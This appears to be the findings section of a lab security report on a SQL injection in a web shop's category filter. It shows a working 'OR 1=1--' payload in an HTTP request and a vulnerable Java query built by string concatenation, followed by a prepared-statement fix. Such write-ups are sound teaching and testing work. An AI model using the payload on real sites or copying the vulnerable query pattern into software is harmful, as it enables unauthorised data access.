## Detailed Findings

### üî¥ CRITICAL: SQL Injection in Product Filter
**OWASP Category:** A03 - Injection  
**CVSS Score:** 9.1 (Critical)  
**Location:** `https://[LAB-ID].web-security-academy.net/filter?category=Gifts`

**Description:**
The application's product category filter is vulnerable to SQL injection. The `category` parameter in the WHERE clause is not properly sanitized, allowing attackers to manipulate the SQL query structure. This enables retrieval of hidden products and potentially sensitive database information.

**Proof of Concept:**

**Original Request (Normal):**
```http
GET /filter?category=Gifts HTTP/2
Host: 0a8b00f2049c8b5e82e4c7a5009300b2.web-security-academy.net
Cookie: session=XqBq7bF2kM2hF8v3L9mN1pR5sT8uY4zA

```

**Malicious Request (SQL Injection):**
```http
GET /filter?category=Gifts'+OR+1=1-- HTTP/2
Host: 0a8b00f2049c8b5e82e4c7a5009300b2.web-security-academy.net
Cookie: session=XqBq7bF2kM2hF8v3L9mN1pR5sT8uY4zA

```

**Payload Analysis:**
- `Gifts'` - Closes the original string parameter
- `OR 1=1` - Always true condition that bypasses the WHERE filter  
- `--` - SQL comment to ignore remaining query

**Expected SQL Query Behavior:**
```sql
-- Original query (secure)
SELECT * FROM products WHERE category = 'Gifts' AND released = 1

-- Injected query (vulnerable)  
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
-- Everything after -- is commented out
```

**Impact:**
- **Data Exposure:** Access to unreleased/hidden products that should not be visible
- **Business Logic Bypass:** Circumvention of application access controls
- **Information Disclosure:** Potential access to sensitive product data, pricing, or inventory information

**Fix:**
- **Immediate:** Implement parameterized queries/prepared statements
- **Code Example (Secure):**
```java
// Vulnerable code
String query = "SELECT * FROM products WHERE category = '" + userInput + "' AND released = 1";

// Secure code  
String query = "SELECT * FROM products WHERE category = ? AND released = 1";
PreparedStatement stmt = connection.prepareStatement(query);
stmt.setString(1, userInput);
```

**Evidence:**
*Normal category filter shows only 3 products*
![Normal Filter](evidence_normal.png)

*SQL injection payload reveals 4 products including hidden ones*
